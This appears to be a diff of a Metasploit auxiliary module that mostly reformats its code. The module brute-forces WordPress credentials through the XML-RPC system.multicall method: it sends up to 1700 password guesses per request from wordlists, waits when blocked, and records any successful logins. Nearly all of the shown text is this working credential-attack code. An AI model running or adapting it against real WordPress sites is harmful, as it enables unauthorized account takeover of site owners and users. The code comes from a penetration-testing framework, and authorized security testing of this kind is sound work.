@@ -13,47 +13,53 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'Wordpress XML-RPC system.multicall Credential Collector',
-      'Description'  => %q{
-        This module attempts to find Wordpress credentials by abusing the XMLRPC
-        APIs. Wordpress versions prior to 4.4.1 are suitable for this type of
-        technique. For newer versions, the script will drop the CHUNKSIZE to 1 automatically.
-      },
-      'Author'      =>
-        [
-          'KingSabri <King.Sabri[at]gmail.com>' ,
+    super(
+      update_info(
+        info,
+        'Name' => 'Wordpress XML-RPC system.multicall Credential Collector',
+        'Description' => %q{
+          This module attempts to find Wordpress credentials by abusing the XMLRPC
+          APIs. Wordpress versions prior to 4.4.1 are suitable for this type of
+          technique. For newer versions, the script will drop the CHUNKSIZE to 1 automatically.
+        },
+        'Author' => [
+          'KingSabri <King.Sabri[at]gmail.com>',
           'William <WCoppola[at]Lares.com>',
           'sinn3r'
         ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/' ],
           ['URL', 'http://web.archive.org/web/20250220003829/https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html' ]
         ],
-      'DefaultOptions' =>
-        {
+        'DefaultOptions' => {
           'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
           'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
         }
-    ))
+      )
+    )
 
     register_options(
       [
         OptInt.new('BLOCKEDWAIT', [ true, 'Time(minutes) to wait if got blocked', 6 ]),
-        OptInt.new('CHUNKSIZE',   [ true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500 ]),
-      ])
+        OptInt.new('CHUNKSIZE', [ true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500 ]),
+      ]
+    )
 
     # Not supporting these options, because we are not actually letting the API to process the
     # password list for us. We are doing that in Metasploit::Framework::LoginScanner::WordpressRPC.
     deregister_options(
       'BLANK_PASSWORDS', 'PASSWORD', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_SKIP_EXISTING'
-      )
+    )
   end
 
   def passwords
-    File.readlines(datastore['PASS_FILE']).lazy.map {|pass| pass.chomp}
+    File.readlines(datastore['PASS_FILE']).lazy.map { |pass| pass.chomp }
   end
 
   def check_options
@@ -98,9 +104,9 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{peer} - Starting XML-RPC login sweep...")
 
     cred_collection = Metasploit::Framework::CredentialCollection.new(
-        blank_passwords: true,
-        user_file: datastore['USER_FILE'],
-        username: datastore['USERNAME']
+      blank_passwords: true,
+      user_file: datastore['USER_FILE'],
+      username: datastore['USERNAME']
     )
 
     scanner = Metasploit::Framework::LoginScanner::WordpressMulticall.new(
@@ -122,15 +128,14 @@ class MetasploitModule < Msf::Auxiliary
     scanner.scan! do |result|
       credential_data = result.to_h
       credential_data.merge!(
-          module_fullname: self.fullname,
-          workspace_id: myworkspace_id
+        module_fullname: self.fullname,
+        workspace_id: myworkspace_id
       )
 
       case result.status
-        when Metasploit::Model::Login::Status::SUCCESSFUL
-          print_brute :level => :vgood, :ip => ip, :msg => "SUCCESSFUL: #{result.credential}"
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        print_brute :level => :vgood, :ip => ip, :msg => "SUCCESSFUL: #{result.credential}"
       end
     end
-
   end
 end
